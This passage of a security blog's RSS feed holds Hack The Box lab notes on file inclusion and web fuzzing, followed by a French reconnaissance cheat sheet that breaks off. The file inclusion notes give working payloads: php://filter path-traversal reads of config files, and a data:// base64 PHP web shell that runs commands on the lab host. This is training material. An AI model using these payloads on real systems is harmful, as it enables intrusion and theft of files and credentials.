+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;You will find a file named &lt;code&gt;configure.php&lt;/code&gt;. Access it with a PHP filter payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://83.136.254.158:57904/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;php://filter/read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;convert.base64-encode/resource&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;configure
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will return a Base64-encoded file. After decoding it, you&amp;rsquo;ll see:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;realpath&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;realpath&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SCRIPT_FILENAME&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;location: /index.php&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_HOST&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db.inlanefreight.local&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_USERNAME&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_PASSWORD&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_DATABASE&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;php-wrappers&#34;&gt;PHP Wrappers:
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Use &lt;strong&gt;curl&lt;/strong&gt; to access sensitive files using PHP wrappers:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://94.237.57.90:46790/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;php://filter/read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;convert.base64-encode/resource&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;../../../../etc/php/7.4/apache2/php.ini
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;To list files on the machine, use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://94.237.54.201:36693/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;amp;cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ls%20/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;After locating the &lt;code&gt;.txt&lt;/code&gt; file, use &lt;code&gt;cat&lt;/code&gt; to read its contents:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://94.237.54.201:36693/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;amp;cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cat%20/37809e2f8952f06139011994726d9ef1.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>Web Fuzzing - HTB Course Notes</title>
+        <link>https://istaarkk.github.io/posts/web-security/web-fuzzing---htb-course-notes/</link>
+        <pubDate>Sat, 01 Jun 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://istaarkk.github.io/posts/web-security/web-fuzzing---htb-course-notes/</guid>
+        <description>&lt;h2 id=&#34;overview&#34;&gt;Overview
+&lt;/h2&gt;&lt;p&gt;These notes cover the &lt;strong&gt;Web Fuzzing&lt;/strong&gt; course on HTB.&lt;/p&gt;
+&lt;h2 id=&#34;first-flag&#34;&gt;First Flag
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To find the first flag, we need to fuzz the site &lt;code&gt;http://address/FUZZ&lt;/code&gt; using &lt;strong&gt;Feroxbuster&lt;/strong&gt;, an open-source tool.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://94.237.61.202:58637/FUZZ -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;recursive-fuzzing-second-flag&#34;&gt;Recursive Fuzzing (Second Flag)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For recursive fuzzing (to get the second flag), use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://94.237.61.202:58637/recursive_fuzz -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;third-flag---gobuster-or-ffuf&#34;&gt;Third Flag - Gobuster or FFUF
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;HTB asks us to use &lt;strong&gt;Gobuster&lt;/strong&gt; for this flag, but we can also use &lt;strong&gt;ffuf&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://83.136.251.168:55827/get.php?x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;FUZZ -w /root/SecLists/Discovery/Web-Content/common.txt -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;vhost-fuzzing&#34;&gt;Vhost Fuzzing
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For virtual host fuzzing, add the host like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;94.237.61.202:39228\tinlanefreight.htb&amp;#39;&lt;/span&gt; | sudo tee -a /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Then, try the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://94.237.61.202:39228 -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: FUZZ.inlanefreight.htb&amp;#34;&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Results:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ADMIN &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 31ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Admin &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 34ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 19ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;awmdata &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 104, Words: 4, Lines: 2, Duration: 22ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ipdata &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 102, Words: 4, Lines: 2, Duration: 15ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;web-beans &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 108, Words: 4, Lines: 2, Duration: 15ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;fuzzing-another-host&#34;&gt;Fuzzing another host
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To fuzz another host, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://FUZZ.inlanefreight.com -w /root/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;hidden-directory-content-length&#34;&gt;Hidden Directory (Content-Length)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To fuzz for a hidden directory based on content length:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.23:31915 -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php .html .gz -t &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Once you find a &lt;code&gt;.gz&lt;/code&gt; file, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -I http://83.136.254.23:31915/ur-hiddenmember/backup.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will give you the correct content length (22/28).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;api-fuzzing&#34;&gt;API Fuzzing
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Use &lt;strong&gt;ffuf&lt;/strong&gt; for API fuzzing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt -u http://94.237.51.84:37078/FUZZ -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Then use &lt;strong&gt;curl&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://94.237.51.84:37078/czcmdcvt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;final-step-finding-the-panel&#34;&gt;Final Step (Finding the Panel)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For the final step, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.23:50543 -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php .html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Once you find a panel, use &lt;strong&gt;ffuf&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt -u http://83.136.254.23:50543/admin/panel.php?accessID&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;FUZZ -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -fs &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;You will find &lt;code&gt;getaccess&lt;/code&gt;, which gives you a new host to fuzz.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title></title>
+        <link>https://istaarkk.github.io/posts/web-security/untitled/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>https://istaarkk.github.io/posts/web-security/untitled/</guid>
+        <description>&lt;h3 id=&#34;fiche-1--reconnaissance&#34;&gt;&lt;strong&gt;FICHE 1 : Reconnaissance&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--collecter-des-informations-sur-la-cible&#34;&gt;&lt;strong&gt;Objectif : Collecter des informations sur la cible.&lt;/strong&gt;
+&lt;/h4&gt;&lt;h5 id=&#34;1-sous-domaines&#34;&gt;&lt;strong&gt;1. Sous-domaines&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Subfinder&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;subfinder -d example.com -o subdomains.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Assetfinder&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;assetfinder --subs-only example.com &amp;gt;&amp;gt; subdomains.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Amass (Mode passif)&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;amass enum -passive -d example.com &amp;gt;&amp;gt; subdomains.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Unifier et trier les résultats&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sort -u subdomains.txt -o subdomains.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-résolution-dns&#34;&gt;&lt;strong&gt;2. Résolution DNS&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MassDNS&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;massdns -r resolvers.txt -t A -o S -w resolved.txt subdomains.txt cat resolved.txt | cut -d &amp;quot; &amp;quot; -f1 &amp;gt; live_subdomains.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-scan-des-ports&#34;&gt;&lt;strong&gt;3. Scan des ports&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Naabu&lt;/strong&gt; (ports ouverts) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;naabu -iL live_subdomains.txt -o open_ports.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;4-scanner-dns&#34;&gt;&lt;strong&gt;4. Scanner DNS&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNSRecon&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dnsrecon -d example.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;fiche-2--exploration-des-services&#34;&gt;&lt;strong&gt;FICHE 2 : Exploration des services&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--identifier-les-services-et-technologies-actifs&#34;&gt;&lt;strong&gt;Objectif : Identifier les services et technologies actifs.&lt;/strong&gt;
+&lt;/h4&gt;&lt;h5 id=&#34;1-scan-réseau-et-bannières&#34;&gt;&lt;strong&gt;1. Scan réseau et bannières&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt; (Scan standard) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -sC -sV -iL open_ports.txt -oN service_scan.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt; (Scan complet) :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -p- -iL live_subdomains.txt -oN full_scan.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2-détection-des-technologies-web&#34;&gt;&lt;strong&gt;2. Détection des technologies web&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;WhatWeb&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;whatweb http://example.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Wappalyzer&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wappalyzer-cli example.com&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;3-capture-des-cibles-http&#34;&gt;&lt;strong&gt;3. Capture des cibles HTTP&lt;/strong&gt;
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Gowitness&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gowitness file -s live_subdomains.txt --threads 10&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;fiche-3--fuzzing-des-endpoints&#34;&gt;&lt;strong&gt;FICHE 3 : Fuzzing des endpoints&lt;/strong&gt;
+&lt;/h3&gt;&lt;h4 id=&#34;objectif--identifier-des-ressources-cachées-ou-sensibles&#34;&gt;&lt;strong&gt;Objectif : Identifier des ressources cachées ou sensibles.&lt;/strong&gt;
